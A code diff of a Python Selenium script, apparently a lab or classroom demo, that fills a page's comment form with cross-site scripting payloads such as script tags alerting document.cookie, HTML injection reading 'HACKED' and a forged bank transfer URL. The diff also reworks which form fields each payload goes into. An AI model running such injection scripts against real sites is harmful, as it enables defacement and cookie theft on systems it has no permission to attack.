@@ -9,7 +9,6 @@ from argparse import RawTextHelpFormatter
 
 import anyconfig
 from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.alert import Alert
 from selenium.common.exceptions import NoAlertPresentException
 
@@ -98,14 +97,13 @@ def get_config(config_file):
 def generate_payload(context):
     if context == 'HTML_PCDATA':
         options = [
-            "<b> bolded all day every day</b>",
-            "<i> italics rule</i>",
-            " \\\ & \\\" a\\ra\\na\\va\\fa\\t",
-            "<h1>HACKED</h1>",
+            # "<b> bolded all day every day</b>",
+            # "<i> italics rule</i>",
+            # "<h1>HACKED</h1>",
             '<input type="file" accept="video/*;capture=camcorder">',
-            '<input type="file" accept="audio/*;capture=microphone">',
-            '<img src="http://forklog.net/wp-content/uploads/2015/05/12035-hacked_article.jpg" />',
-            '<iframe width="420" height="315" src="https://www.youtube.com/embed/7t96m2ynKw0&autoplay=1" frameborder="0" allowfullscreen></iframe>'
+            # '<input type="file" accept="audio/*;capture=microphone">',
+            # '<img src="http://forklog.net/wp-content/uploads/2015/05/12035-hacked_article.jpg" />',
+            # '<iframe width="420" height="315" src="https://www.youtube.com/embed/7t96m2ynKw0&autoplay=1" frameborder="0" allowfullscreen></iframe>'
         ]
         return random.choice(options)
     elif context == 'HTML_QUOTED':
@@ -120,9 +118,8 @@ def generate_payload(context):
         return 'https://bank.com/transfer?id=hacker&amount=1000000000'
     elif context == 'JS_STRING':
         options = [
-            '<script>alert(document.cookie + " YOU\'VE BEEN HACKED")</script>',
-            '</script>alert("XSSSSSSSSSSSED AGAIN")</script>',
-            "javascript:(function(){var s=document.createElement('style');s.innerHTML='%40-moz-keyframes roll { 100%25 { -moz-transform: rotate(360deg); } } %40-o-keyframes roll { 100%25 { -o-transform: rotate(360deg); } } %40-webkit-keyframes roll { 100%25 { -webkit-transform: rotate(360deg); } } body{ -moz-animation-name: roll; -moz-animation-duration: 4s; -moz-animation-iteration-count: 1; -o-animation-name: roll; -o-animation-duration: 4s; -o-animation-iteration-count: 1; -webkit-animation-name: roll; -webkit-animation-duration: 4s; -webkit-animation-iteration-count: 1; }';document.getElementsByTagName('head')[0].appendChild(s);}());",
+            # '<script>alert(document.cookie + " YOU\'VE BEEN HACKED")</script>',
+            '<script>alert("HACKED AGAIN")</script>'
         ]
         return random.choice(options)
 
@@ -150,18 +147,30 @@ def main():
 
     cli = Cli()
     driver = make_driver(cli.args.browser)
+    driver.maximize_window()
     driver.get(cli.args.url)
-    comment_form = driver.find_element_by_id('commentForm')
-    comment_message = driver.find_element_by_name('message')
-    comment_link = driver.find_element_by_name('link')
-    for payload in generate_all_payloads(CONTEXTS):
-        send_key_sequence(comment_message, payload)
-        # Try this later
-        # send_key_sequence(comment_link, payload)
+    handle_alert(driver)
+    for i, payload in enumerate(generate_all_payloads(CONTEXTS)):
+        handle_alert(driver)
+        comment_form = driver.find_element_by_id('commentForm')
+        if i in [0, 1, 2, 6]:
+            comment_message = driver.find_element_by_name('message')
+            send_key_sequence(comment_message, payload)
+        elif i in [3, 4, 5]:
+            comment_message = driver.find_element_by_name('message')
+            comment_link = driver.find_element_by_name('link')
+            send_key_sequence(comment_message, 'Check out this link!')
+            send_key_sequence(comment_link, payload)
+        else:
+            comment_message = driver.find_element_by_name('message')
+            comment_link = driver.find_element_by_name('link')
+            send_key_sequence(comment_message, payload)
+            send_key_sequence(comment_link, payload)
+
         comment_form.submit()
-        # Maybe make this shorter or longer in order to see the effect of XSS
         time.sleep(2)
         handle_alert(driver)
+
     driver.close()
 
 
